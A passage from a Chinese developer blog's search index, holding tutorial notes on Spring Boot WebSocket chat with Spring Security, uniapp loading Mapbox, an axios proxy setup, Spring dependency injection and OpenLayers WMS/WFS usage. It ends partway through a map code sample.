$(function () { $(\u0026#34;#connect\u0026#34;).click(function () { connect(); }); $(\u0026#34;#disconnect\u0026#34;).click(function () { disconnect(); }); $(\u0026#34;#send\u0026#34;).click(function () { sendName(); }); }) 消息点对点发送 点对点发送，应该有用户的概念，因此需加入spring security依赖\n1.配置spring security 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 @Configuration public class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Bean PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(); // System.out.println(\u0026#34;------------encoder.encode:\u0026#34; + encoder.encode(\u0026#34;456\u0026#34;)); // super.configure(auth); auth.inMemoryAuthentication() .withUser(\u0026#34;admin\u0026#34;) .password(encoder.encode(\u0026#34;123\u0026#34;)) .roles(\u0026#34;admin\u0026#34;) .and() .withUser(\u0026#34;sang\u0026#34;) .password(encoder.encode(\u0026#34;456\u0026#34;)) .roles(\u0026#34;user\u0026#34;); } @Override protected void configure(HttpSecurity http) throws Exception { // super.configure(http); http.authorizeRequests() .anyRequest().authenticated() .and() .formLogin().permitAll(); } } 2.configuration 同上，多加了一个/queue，方便对群发消息和点对点消息进行管理\n3.controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 @Controller public class GreetingController { @Autowired SimpMessagingTemplate messagingTemplate; // @MessageMapping(\u0026#34;/hello\u0026#34;)用来接收\u0026#34;/app/hello\u0026#34;发送的消息 // 再将消息转发到@SendTo定义的路径上(前缀为\u0026#34;/topic\u0026#34;,消息将会被broker代理，再由broker广播) @MessageMapping(\u0026#34;/hello\u0026#34;) @SendTo(\u0026#34;/topic/greetings\u0026#34;) public Message greeting(Message message) throws Exception{ return message; } // @MessageMapping(\u0026#34;/hello\u0026#34;) // public void greeting(Message message) throws Exception{ // messagingTemplate.convertAndSend(\u0026#34;/topic/greetings\u0026#34;,message); // } @MessageMapping(\u0026#34;/chat\u0026#34;) public void chat(Principal principal, Chat chat){ // Principal用来获取当前登录用户的信息，第二个参数是客户端发送来的消息 String from = principal.getName(); chat.setFrom(from); // System.out.println(\u0026#34;------------chat.getTo():\u0026#34; + chat.getTo()); messagingTemplate.convertAndSendToUser(chat.getTo(),\u0026#34;/queue/chat\u0026#34;,chat); } } @Data public class Chat { private String to; private String from; private String content; } 消息发送使用的方法是convertAndSendToUser，该方法内部调用了convertAndSend方法，并对消息路径做了处理，部门源码如下：\n1 2 3 4 5 6 7 public void convertAndSendToUser(String user, String destination, Object payload, @Nullable Map\u0026lt;String, Object\u0026gt; headers, @Nullable MessagePostProcessor postProcessor) throws MessagingException { Assert.notNull(user, \u0026#34;User must not be null\u0026#34;); Assert.isTrue(!user.contains(\u0026#34;%2F\u0026#34;), \u0026#34;Invalid sequence \\\u0026#34;%2F\\\u0026#34; in user name: \u0026#34; + user); user = StringUtils.replace(user, \u0026#34;/\u0026#34;, \u0026#34;%2F\u0026#34;); destination = destination.startsWith(\u0026#34;/\u0026#34;) ? destination : \u0026#34;/\u0026#34; + destination; super.convertAndSend(this.destinationPrefix + user + destination, payload, headers, postProcessor); } 这里destinationPrefix的默认值是\u0026quot;/user/\u0026quot;，也就是说消息的最终发送路径是 \u0026quot;/user/用户名/queue/chat\u0026quot;\n4.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;单聊\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;../lib/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/sockjs-client/1.1.2/sockjs.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/stomp-websocket/2.3.3/stomp.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../js/chat.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;chat\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;chatsContent\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; 请输入聊天内容： \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;content\u0026#34; placeholder=\u0026#34;聊天内容\u0026#34;\u0026gt; 目标用户： \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;to\u0026#34; placeholder=\u0026#34;目标用户\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;send\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.JavaScript 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 var stompClient = null; function connect() { var socket = new SockJS(\u0026#39;/portal/chat\u0026#39;); stompClient = Stomp.over(socket); stompClient.connect({}, function (frame) { // 订阅的地址比服务端配置的地址多了\u0026#34;/user\u0026#34;前缀， // 是因为SimpMessagingTemplate类中自动添加了路径前缀 stompClient.subscribe(\u0026#39;/user/queue/chat\u0026#39;, function (chat) { console.log(\u0026#34;chat:\u0026#34;,chat); showGreeting(JSON.parse(chat.body)); }); }); } function sendMsg() { stompClient.send(\u0026#34;/app/chat\u0026#34;, {}, JSON.stringify({\u0026#39;content\u0026#39;: $(\u0026#34;#content\u0026#34;).val(), \u0026#39;to\u0026#39;: $(\u0026#34;#to\u0026#34;).val()})); } function showGreeting(message) { $(\u0026#34;#chatsContent\u0026#34;) .append(\u0026#34;\u0026lt;div\u0026gt;\u0026#34; + message.from + \u0026#34;:\u0026#34; + message.content + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;) } $(function () { connect(); $(\u0026#34;#send\u0026#34;).click(function () { sendMsg(); }); }) ","permalink":"https://chance7bin.github.io/posts/note/springboot%E6%95%B4%E5%90%88websocket/","summary":"WebSocket是一种在单个TCP连接上进行全双工通信的协议，浏览器和服务器只需要完成一次握手，两者之间就可以直接创建持久性的连接，并进行","title":"SpringBoot整合WebSocket"},{"content":"小程序的踩坑之旅 1 uniapp 本身是加载不了mapbox的 下面两个是在vue环境下导入mapbox\nhttps://blog.csdn.net/weixin_44402694/article/details/87794850\nhttps://blog.csdn.net/Isaac_Play/article/details/103890231?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\u0026amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\n==uniapp中加载mapbox会出现这个错误==\n\u0026ldquo;TypeError: Cannot read property \u0026lsquo;getElementById\u0026rsquo; of undefined\u0026rdquo;\n原因：微信小程序不支持操作dom元素， dom is not defined\nmapbox 他的Map方法里面就用的document.getElementById ，是封装好的，因此加载不出来，如下图\n2 小程序仅支持加载网络网页，不支持本地html App 平台同时支持网络网页和本地网页，但本地网页及相关资源（js、css等文件）必须放在uni-app 项目根目录-\u0026gt;hybrid-\u0026gt;html文件夹下，如下为一个加载本地网页的uni-app项目文件目录示例：\n加载本地文件加载不了\n1 this.url = `/hybrid/html/map/chooseDev.html` 加载网络文件可以\n1 this.url = \u0026#39;http://ip地址:8080/tgmobile/hybrid/html/map/chooseDev.html?lon=119.318580\u0026amp;lat=26.034681\u0026#39; 文章\nhttps://www.jianshu.com/p/adc72eae0593\nhttps://www.cnblogs.com/lizhao123/p/11558674.html\n**注意：**目前通过webview跳转到其他网址支持：\n1、与微信小程序绑定的微信公众号文章地址;\n2、在微信小程序后台配置好业务域名的地址。\n3 查看官方文档，copy实例代码，终于可以加载出来了！！！ https://uniapp.dcloud.io/component/web-view\nuni.postMessage(OBJECT)\n网页向应用发送消息，在 \u0026lt;web-view\u0026gt; 的message事件回调 event.detail.data 中接收消息。\nTips\n传递的消息信息，必须写在data对象中。\nevent.detail.data中的数据，以数组的形式接收每次 post 的消息。\n1 2 3 4 5 6 7 8 // 待触发 `UniAppJSBridgeReady` 事件后，即可调用 uni 的 API。 document.addEventListener(\u0026#39;UniAppJSBridgeReady\u0026#39;, function() { uni.postMessage({ data: { action: \u0026#39;message\u0026#39; } }); }); 代码如下：\n跳转的vue组件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;view\u0026gt; \u0026lt;web-view :src=\u0026#34;url\u0026#34; @message=\u0026#34;getMessage\u0026#34;\u0026gt;\u0026lt;/web-view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default{ data(){ return{ url:\u0026#39;\u0026#39; } }, onLoad(option) { console.log(\u0026#34;chooseDev option:\u0026#34;,option) this.url = \u0026#39;http://ip地址:8080/tgmobile/hybrid/html/map/chooseDevTest.html\u0026#39; }, methods:{ getMessage(e){ console.log(\u0026#34;e:\u0026#34;,e) } } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; webview页面：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;网络网页\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v1.12.0/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v1.12.0/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.write(\u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://res.wx.qq.com/open/js/jweixin-1.4.0.js\u0026#34;\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;!-- uni 的 SDK --\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://js.cdn.aliyun.dcloud.net.cn/dev/uni-app/uni.webview.1.5.2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // 待触发 `UniAppJSBridgeReady` 事件后，即可调用 uni 的 API。 document.addEventListener(\u0026#39;UniAppJSBridgeReady\u0026#39;, function() { uni.postMessage({ data: { action: \u0026#39;message\u0026#39; } }); uni.getEnv(function(res) { console.log(\u0026#39;当前环境：\u0026#39; + JSON.stringify(res)); }); mapboxgl.accessToken = \u0026#39;your accessToken\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, zoom: 14, center: [119.318580, 26.034681], minZoom: 3 }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","permalink":"https://chance7bin.github.io/posts/map/uniapp%E5%8A%A0%E8%BD%BDmapbox%E5%B9%B6%E5%8F%91%E5%B8%83%E6%88%90%E5%B0%8F%E7%A8%8B%E5%BA%8F/","summary":"小程序的踩坑之旅 1 uniapp 本身是加载不了mapbox的 下面两个是在vue环境下导入mapbox https://blog.csdn.net/weixin_44402694/article/details/87794850 https://blog.csdn.net/Isaac_Play/article/details/103890231?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\u0026amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3 ==uniapp中加载mapbox会出现这个错误","title":"uniapp加载mapbox并发布成小程序"},{"content":"axios的使用 1.安装命令：cnpm instal axios \u0026ndash;save 2.main.js引入全局使用 1 2 3 4 //axios import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios 3.组件或页面中使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 methods: { testAxios1:function(){ console.log(\u0026#39;test\u0026#39;); this.$axios({ method: \u0026#39;get\u0026#39;, url: \u0026#39;data/personData.json\u0026#39; }) .then(function (response) { console.log(response) }) .catch(function (error) { console.log(error) }) }, axios配置开发环境跨域请求代理 1.配置BaseUrl 在main.js中，配置数据所在服务器的前缀（即固定部分），代码如下：\n1 2 3 4 import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios axios.defaults.baseURL = \u0026#39;/api\u0026#39; //关键代码 Vue.config.productionTip = false 2.打开config/index.js 在这里面找到proxyTable{}，改为这样：\n1 2 3 4 5 6 7 8 9 proxyTable: { \u0026#39;/api\u0026#39;: { target:\u0026#39;http://api.douban.com/v2\u0026#39;, // 你请求的第三方接口 changeOrigin:true, // 在本地会创建一个虚拟服务端，然后发送请求的数据，并同时接收请求的数据，这样服务端和服务端进行数据的交互就不会有跨域问题 pathRewrite:{ // 路径重写， \u0026#39;^/api\u0026#39;: \u0026#39;\u0026#39; // 替换target中的请求地址，也就是说以后你在请求http://api.douban.com/v2/XXXXX这个地址的时候直接写成/api即可。 } } }, 3.使用 1 2 3 4 5 6 7 8 axios.get(\u0026#34;/movie/top250\u0026#34;).then((res) =\u0026gt; { res = res.data if (res.errno === ERR_OK) { this.themeList=res.data; } }).catch((error) =\u0026gt; { console.warn(error) }) ==4.重新启动项目！！！== ","permalink":"https://chance7bin.github.io/posts/note/axios%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","summary":"axios的使用 1.安装命令：cnpm instal axios \u0026ndash;save 2.main.js引入全局使用 1 2 3 4 //axios import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios 3.组件或页面中使用 1 2 3 4 5 6 7 8 9 10 11","title":"axios跨域问题"},{"content":"在项目中遇到这么一个困惑\n在controller层自动装配了一个service的接口\n1 2 @Resource ProjectService projectService; ==为什么可以直接使用接口实现类重写的方法？==\n1 2 3 public List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus){ return projectService.getProjectList(projectName,projectStatus); } ProjectService.java\n1 2 3 public interface ProjectService { List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus); } ProjectServiceImpl.java\n1 2 3 4 5 6 7 8 @Service public class ProjectServiceImpl implements ProjectService{ @Override public List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus) { ... return postProjectList; } } @service\n接口实现类上的@service注解等价于\nxml配置文件上的\u0026lt;bean id=\u0026quot;projectServiceImpl\u0026quot; class=\u0026quot;service.ProjectServiceImpl\u0026quot;/\u0026gt; 上述配置等价于\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!--在Spring中创建对象，在Spring这些都称为bean 类型 变量名 = new 类型(); Holle holle = new Holle(); bean = 对象(holle) id = 变量名(holle) class = new的对象(new Holle();) property 相当于给对象中的属性设值,让str=\u0026#34;Spring\u0026#34; --\u0026gt; \u0026lt;bean id=\u0026#34;hello\u0026#34; class=\u0026#34;pojo.Hello\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;str\u0026#34; value=\u0026#34;Spring\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; controller层上的\n1 2 @Resource ProjectService projectService; 下面先来了解一下@Autowired和@Resource\n@Autowired\n@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired。\n@Autowired采取的策略为按照类型注入。\n1 2 3 4 public class UserService { @Autowired private UserDao userDao; } 如上代码所示，这样装配会去spring容器中找到类型为UserDao的类，然后将其注入进来。这样会产生一个问题，当一个类型有多个bean值的时候，会造成无法选择具体注入哪一个的情况，这个时候我们需要配合着@Qualifier使用。\n@Qualifier告诉spring具体去装配哪个对象。\n1 2 3 4 5 public class UserService { @Autowired @Qualifier(name=\u0026#34;userDao1\u0026#34;) private UserDao userDao; } 这个时候我们就可以通过类型和名称定位到我们想注入的对象\n@Resource\n@Resource注解由J2EE提供，需要导入包javax.annotation.Resource。\n@Resource默认按照ByName自动注入。\n1 2 3 4 5 6 7 8 9 10 public class UserService { @Resource private UserDao userDao; @Resource(name=\u0026#34;studentDao\u0026#34;) private StudentDao studentDao; @Resource(type=\u0026#34;TeacherDao\u0026#34;) private TeacherDao teacherDao; @Resource(name=\u0026#34;manDao\u0026#34;,type=\u0026#34;ManDao\u0026#34;) private ManDao manDao; } ①如果同时指定了name和type，则从Spring上下文中找到唯一匹配的bean进行装配，找不到则抛出异常。\n②如果指定了name，则从上下文中查找名称（id）匹配的bean进行装配，找不到则抛出异常。\n③如果指定了type，则从上下文中找到类似匹配的唯一bean进行装配，找不到或是找到多个，都会抛出异常。\n④如果既没有指定name，又没有指定type，则自动按照byName方式进行装配（当找不到与名称匹配的bean时才按照类型进行装配。但是需要注意的是，如果name属性一旦指定，就只会按照名称进行装配）；如果没有匹配，则回退为一个原始类型进行匹配，如果匹配则自动装配。\n推荐使用：@Resource注解在字段上，这样就不用写setter方法了，并且这个注解是属于J2EE的，减少了与spring的耦合。这样代码看起就比较优雅。\n针对不用写setter方法的理解，看下面\n1 2 3 4 5 6 7 8 //在Service层的实现类(UserServiceImpl)增加一个Set()方法 //利用set动态实现值的注入！ //DAO层并不写死固定调用哪一个UserDao的实现类 //而是通过Service层调用方法设置实现类！ private UserDao userDao; public void setUserDao(UserDao userDao){ this.userDao = userDao; } 1 ((UserServiceImpl)userService).setUserDao(new UserDaoImpl()); set方法中的参数为接口，传入的参数为接口的实现（类似代理模式）\n自己的理解：@Resource标注在ProjectService接口上，取属性名（projectService）进行装配，没有找到（@Service标注的ProjectServiceImpl默认名字是projectServiceImpl），再找相同类型的，找到ProjectServiceImpl（这里是通过多态的向上转型的方式判定ProjectServiceImpl和其接口的类型一样，所以虽然我们定义的属性是接口类型的，但是最终时候会装配到实现类上），实现自动装配\n参考文章：\nhttps://blog.csdn.net/weixin_40423597/article/details/80643990\nhttps://www.cnblogs.com/jichi/p/10073404.html\n","permalink":"https://chance7bin.github.io/posts/note/spring-%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D-%E6%8E%A5%E5%8F%A3/","summary":"在项目中遇到这么一个困惑 在controller层自动装配了一个service的接口 1 2 @Resource ProjectService projectService; ==为什么可以直接使用接口实现类重写的方法？==","title":"Spring 自动装配 接口"},{"content":"报错如下：\n1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ServiceExceptionReport version=\u0026#34;1.3.0\u0026#34; xmlns=\u0026#34;http://www.opengis.net/ogc\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.opengis.net/ogc http://fzzt.fzjhdn.com:10080/geoserver/schemas/wms/1.3.0/exceptions_1_3_0.xsd\u0026#34;\u0026gt; \u0026lt;ServiceException code=\u0026#34;LayerNotQueryable\u0026#34; locator=\u0026#34;QUERY_LAYERS\u0026#34;\u0026gt; Either no layer was queryable, or no layers were specified using QUERY_LAYERS \u0026lt;/ServiceException\u0026gt; \u0026lt;/ServiceExceptionReport\u0026gt; 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var view = map.getView(); var viewResolution = view.getResolution(); var source = requestLayer.getSource(); var url = source.getFeatureInfoUrl( evt.coordinate, viewResolution, view.getProjection(), { \u0026#39;INFO_FORMAT\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;FEATURE_COUNT\u0026#39;: 50 }); if (url) { console.log(\u0026#34;url:\u0026#34;,url) $.ajax({ url: url, type: \u0026#39;GET\u0026#39;, async: true, contentType: \u0026#39;application/json;charset=utf-8\u0026#39;, success: data =\u0026gt; { console.log(\u0026#34;data:\u0026#34;,data) console.log(\u0026#34;length:\u0026#34;,data.features.length) } }) } 解决方法：\n看了下官方文档，他说如果没有提供QUERY_LAYERS，那么将使用layers参数中指定的layers。\n之前用写死的图层做的时候是不需要提供这个的，但是改成动态添加图层之后没有这个就会报错，原因未知，那就只好加上这个了，无奈，只好在服务的json文件里再加上一个这个layer属性了\n","permalink":"https://chance7bin.github.io/posts/map/openlayers-wms%E7%82%B9%E5%87%BB%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99/","summary":"报错如下： 1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ServiceExceptionReport version=\u0026#34;1.3.0\u0026#34; xmlns=\u0026#34;http://www.opengis.net/ogc\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.opengis.net/ogc http://fzzt.fzjhdn.com:10080/geoserver/schemas/wms/1.3.0/exceptions_1_3_0.xsd\u0026#34;\u0026gt; \u0026lt;ServiceException code=\u0026#34;LayerNotQueryable\u0026#34; locator=\u0026#34;QUERY_LAYERS\u0026#34;\u0026gt; Either no layer was queryable, or no layers were specified using QUERY_LAYERS \u0026lt;/ServiceException\u0026gt; \u0026lt;/ServiceExceptionReport\u0026gt; 代码如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var view = map.getView(); var viewResolution =","title":"openlayers wms点击查询报错"},{"content":"1.地图无法加载出来的原因 在onLoad方法执行时，map还未渲染出来，无法操作map这个标签的dom，因此地图无法显示出来（也即在onLoad中调用loadMap打印第一行日志为null） 还有一个问题是script标签要加module\n\u0026lt;script module=\u0026quot;ol\u0026quot; lang=\u0026quot;renderjs\u0026quot;\u0026gt;\n2. openlayer坐标显示不匹配问题 须在view中对坐标系进行转换\n1 2 3 4 5 6 let view = new View({ center: fromLonLat([105, 34],\u0026#39;EPSG:3857\u0026#39;), zoom: 5, maxZoom: 18, minZoom: 1 }); 如果要素显示不出来，那么在url后面加上 srsname=EPSG:4326\n因为 view 设置的 projection: 'EPSG:4326' ，所以此处设置 srsname=EPSG:4326。\n3.postgis导入矢量数据时的SRID设置 SRID设置为多少的一个简便的查看方法是把需要导入的图层先通过geoserver的发布图层预发布，在发布图层的设置中，geoserver会自动的识别该矢量数据的SRS，即为postgis中导入矢量数据时设置的SRID，如果在导入postgis中不设置的话，可能会出现openlayers显示不出图层的问题。（SRID也可在pgAdmin中设置）\n4. uniapp ol样式无法引入文件 App平台 v3 模式暂不支持在 js 文件中引用\u0026quot;ol/ol.css\u0026quot; 请改在 style 内引用\n在App.vue中引入\n1 2 3 4 \u0026lt;style\u0026gt; /*每个页面公共css */ @import \u0026#39;/node_modules/ol/ol.css\u0026#39;; \u0026lt;/style\u0026gt; 5. openlayers加载自定义底图 天地图有7个服务节点，可以不固定使用其中一个节点的服务，而是使用 Math.round(Math.random()*7) 的方式随机决定从哪个节点请求服务，避免指定节点因故障等原因停止服务的风险。\n天地图会出现这个问题\n用高德底图\n6. 统计模块的开发 请求wfs服务获取所有要素的信息来进行统计模块的开发是不可行的\n使用 $.getJSON 以及 uni.request 都有请求大小的限制（当请求的数据过大时会出现 “unexpected EOF”），而且会把请求到的数据的每一个属性都请求下来，对于空间数据，其geom属性对于统计功能来说是没有必要的，由于线、面等数据是通过一个个点构成的，其geom含有大量点坐标信息，因此包含该属性的json数据相当大，若请求的数据较多，其json数据大小会远远超过$.getJSON 以及 uni.request 的限制，导致程序崩溃，因此考虑使用springboot连接postgis数据库，通过选择除了geom的其他字段来大大减小空间json数据的大小。\n7.分屏功能的开发 分屏\nopenlayers地图联动 图层不能共用\n地图渲染 要和页面渲染 同步 不然地图加载不出来\n地图渲染时机：设置延时加载\n创建的图层不能共用！！！ 必须new一个新的\n","permalink":"https://chance7bin.github.io/posts/map/openlayers-uniapp-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","summary":"1.地图无法加载出来的原因 在onLoad方法执行时，map还未渲染出来，无法操作map这个标签的dom，因此地图无法显示出来（也即在onLo","title":"openlayers uniapp 移动端开发问题汇总"},{"content":"1.加载在线WFS服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 \u0026lt;template\u0026gt; \u0026lt;view\u0026gt; \u0026lt;view id=\u0026#34;map\u0026#34; ref=\u0026#34;rootmap\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; \u0026lt;view style=\u0026#34;display: flex;\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;moveView\u0026#34;\u0026gt;moveView\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;fitToChengdu\u0026#34;\u0026gt;fitToChengdu\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script module=\u0026#34;ol\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; import \u0026#39;ol/ol.css\u0026#39;; import Map from \u0026#39;ol/Map\u0026#39;; import View from \u0026#39;ol/View\u0026#39;; import {Vector as VectorLayer,Tile as TileLayer} from \u0026#39;ol/layer\u0026#39;; import {Vector as VectorSource,OSM,XYZ} from \u0026#39;ol/source\u0026#39;; import {GeoJSON} from \u0026#39;ol/format\u0026#39;; import {bbox} from \u0026#39;ol/loadingstrategy\u0026#39; import {Style,Stroke,Circle,Fill} from \u0026#39;ol/style\u0026#39;; import {fromLonLat} from \u0026#39;ol/proj\u0026#39; var map = null export default { name: \u0026#39;OlWFS\u0026#39;, data() { return { }; }, onReady() { this.loadMap() }, methods:{ loadMap(){ //创建wfs资源 let wfsVectorSource = new VectorSource({ format: new GeoJSON(), projection: \u0026#39;EPSG:4326\u0026#39;, url: \u0026#39;/api/maptest/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Aqunaer_data_final\u0026amp;maxFeatures=500\u0026amp;outputFormat=application%2Fjson\u0026#39;, strategy: bbox }); let wfsVectorSourcePolygon = new VectorSource({ format: new GeoJSON(), projection: \u0026#39;EPSG:4326\u0026#39;, url: \u0026#39;/api/maptest/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Achina_province\u0026amp;maxFeatures=50\u0026amp;outputFormat=application%2Fjson\u0026#39;, strategy: bbox }); //创建wfs图层，注意需要设置好描边样式，否则不展示效果出来 let wfsVectorLayer = new VectorLayer({ source: wfsVectorSource, style: new Style({ image: new Circle({ radius: 5, fill: new Fill({ color: \u0026#34;#3885ff\u0026#34;, opacity: 0.5 }) }), stroke: new Stroke({ color: \u0026#39;blue\u0026#39;, width: 5 }) }), visible: true }); //view设置 let view = new View({ // center: fromLonLat([105, 34],\u0026#39;EPSG:3857\u0026#39;), center: [105, 34], zoom: 5, maxZoom: 18, minZoom: 5, projection: \u0026#39;EPSG:4326\u0026#39; });\t//创建一个map map = new Map({ layers: [ new TileLayer({ // source: new OSM() //这个会出现底图 source: new XYZ({ url: \u0026#39;http://{a-c}.tile.openstreetmap.org/{z}/{x}/{y}.png\u0026#39; }) }), wfsVectorLayer ], target: \u0026#34;map\u0026#34;, view: view }); map.on(\u0026#39;click\u0026#39;, function(evt) { console.log(\u0026#34;evt:\u0026#34;,evt.pixel) // displayFeatureInfo(evt.pixel); var feature = map.forEachFeatureAtPixel(evt.pixel, function(feature) { return feature; }); console.log(\u0026#34;feature:\u0026#34;,feature) if(feature != null){ console.log(\u0026#34;feature getId:\u0026#34;,feature.getId()) console.log(\u0026#34;feature getKeys:\u0026#34;,feature.getKeys()) console.log(\u0026#34;feature getProperties:\u0026#34;,feature.getProperties()) } }); }, // 向左移动地图 moveView(){ var view = map.getView(); var mapCenter = view.getCenter(); // 让地图中心的x值增加，即可使得地图向左移动，增加的值根据效果可自由设定 console.log(\u0026#34;mapCenter:\u0026#34;,mapCenter) mapCenter[0] += 50000; view.setCenter(mapCenter); map.render(); }, fitToChengdu() { // 让地图最大化完全地显示区域[104, 30.6, 104.12, 30.74] map.getView().fit([104, 30.6, 104.12, 30.74], map.getSize()); }, 